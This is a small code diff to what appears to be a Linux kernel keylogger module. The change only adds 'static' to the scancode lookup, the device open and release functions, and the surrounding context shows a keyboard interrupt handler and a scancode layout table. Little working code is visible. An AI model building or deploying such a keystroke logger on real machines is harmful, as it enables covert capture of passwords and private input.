@@ -72,7 +72,7 @@ START_LAYOUT(scancode_set1)
 	KN("F11"); KN("F12");
 END_LAYOUT
 
-int scanset_contains(int scancode) {
+static int scanset_contains(int scancode) {
 	return 0 <= scancode && scancode < sizeof(scancode_set1) / sizeof(*scancode_set1);
 }
 
@@ -232,7 +232,7 @@ static irqreturn_t keylog_irq_handler(int irq,  void *dev) {
 	return IRQ_HANDLED;
 }
 
-int keylog_device_open(struct inode *inode, struct file *file) {
+static int keylog_device_open(struct inode *inode, struct file *file) {
 	int ret = 0;
 	struct keylog_list *list;
 
@@ -275,7 +275,7 @@ free:
 	return ret;
 }
 
-int keylog_device_release(struct inode *inode, struct file *file) {
+static int keylog_device_release(struct inode *inode, struct file *file) {
 	struct keylog_list *list = ((struct seq_file*)file->private_data)->private;
 	struct list_head *cur;
 	struct list_head *q;
